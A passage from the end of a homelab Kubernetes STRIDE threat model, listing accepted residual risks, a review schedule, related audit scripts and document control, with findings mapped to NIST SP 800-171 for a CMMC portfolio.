| RR-02 | Single FreeIPA instance — auth SPOF | LOW | HIGH | **Yes** | Replica implementation deferred to Phase 12; local fallback auth for emergency node access |
| RR-03 | No hardware security module for etcd or FreeIPA CA | LOW | HIGH | **Yes** | Lab environment; CA key protected by filesystem permissions + AIDE monitoring |
| RR-04 | Container images pulled from public registries at build time | MED | MED | **Yes** | Trivy scanning in pipeline provides compensating control; full private mirror deferred |
| RR-05 | No eBPF-based runtime behavioral detection (Falco) | MED | HIGH | **Conditional** | Mitigated by k8s audit log analysis and AIDE; Falco installation is a Phase 12 objective |
| RR-06 | No pod-to-pod mutual TLS (service mesh) | MED | MED | **Conditional** | NetworkPolicy provides network-layer isolation; Istio or Linkerd mTLS is Phase 12 scope |
| RR-07 | Longhorn volumes not encrypted at underlying block device level | LOW | MED | **Yes** | Application-level encryption acceptable for lab; LUKS would require Proxmox guest changes |

---

## 12. Review and Maintenance

### 12.1 Review Schedule

| Trigger | Action |
|---|---|
| **Quarterly** | Full review of all CRITICAL and HIGH findings; confirm mitigations remain effective; update threat matrix |
| **New component added** | Extend threat model for new component; re-evaluate all cross-cutting threats |
| **Security incident** | Post-incident review; add new threats identified during investigation; update residual risk register |
| **Major version upgrade** | Review CVE database for new threats to upgraded components; update T-14.1 kernel CVE tracking |
| **Personnel change** | Review all credential and access grants; run FreeIPA account auditor; rotate shared credentials |
| **Annual** | Full document review; validate all NIST control mappings against current configuration |

### 12.2 Related Documents and Scripts

| Document / Script | Path | Description |
|---|---|---|
| Build Checklist | `docs/homelab-build-checklist.md` | 117-item phased implementation checklist |
| AIDE Log Parser | `scripts/aide_to_splunk.py` | FIM event ingestion → Splunk HEC |
| K8s Secret Auditor | `scripts/k8s_secret_auditor.py` | Audit log anomaly detection (15 rules) |
| FreeIPA Account Auditor | `scripts/freeipa_account_auditor.py` | Stale account detection with NIST mapping |
| Network Diagrams | `docs/homelab-network-diagrams.html` | L1/L2/L3 topology + security zone overlays |
| Workflow Diagrams | `docs/homelab-workflow-diagrams.html` | GitOps, CI/CD, and automation flow diagrams |

### 12.3 Document Control

| Version | Date | Author | Changes |
|---|---|---|---|
| 1.0 | 2026-03-02 | Jason A. Slocomb | Initial release — full STRIDE analysis across 14 components, 35 threat entries, complete NIST 800-171 mapping |

---

*This document was produced as part of the homelab Kubernetes security engineering portfolio demonstrating CMMC Level 2 compliance architecture and threat modeling capability. It follows the STRIDE threat modeling methodology and maps findings to NIST SP 800-171 Rev 2 security requirements for Controlled Unclassified Information protection.*
